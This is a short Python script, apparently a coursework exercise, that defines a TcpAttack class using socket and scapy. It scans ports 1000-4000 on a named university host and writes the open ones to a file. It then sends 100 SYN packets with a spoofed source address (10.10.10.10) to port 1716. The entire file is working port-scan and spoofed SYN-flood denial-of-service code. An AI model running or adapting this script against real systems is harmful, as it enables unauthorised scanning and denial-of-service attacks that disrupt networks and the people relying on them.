import sys, socket
import os.path
import re
from scapy.all import *

class TcpAttack():
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        fileout = open('openports.txt', 'w')
        for port in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)

            try:
                sock.connect((self.targetIP, port))
                fileout.write(str(port) + "\n")
            except:
                pass
    
    def attackTarget(self, port, numSyn):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        testport = 0

        try: 
            sock.connect((self.targetIP, port))
            testport = 1
        except:
            pass

        if testport == 1:
            for i in range(numSyn):
                IP_header = IP(src =self.spoofIP, dst=self.targetIP)
                TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
                packet =  IP_header / TCP_header
                try:
                    send(packet)
                except:
                    pass

            return 1
        else:
            return 0

if __name__ == "__main__":
    spoofIP = '10.10.10.10'
    targetIP = 'moonshine.ecn.purdue.edu'

    rangeStart = 1000
    rangeEnd = 4000

    port = 1716
    numSyn = 100

    tcp = TcpAttack (spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)

    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open, and flooded with {numSyn} SYN packets")
    else:
        print(f"Port {port} was not open to be attacked")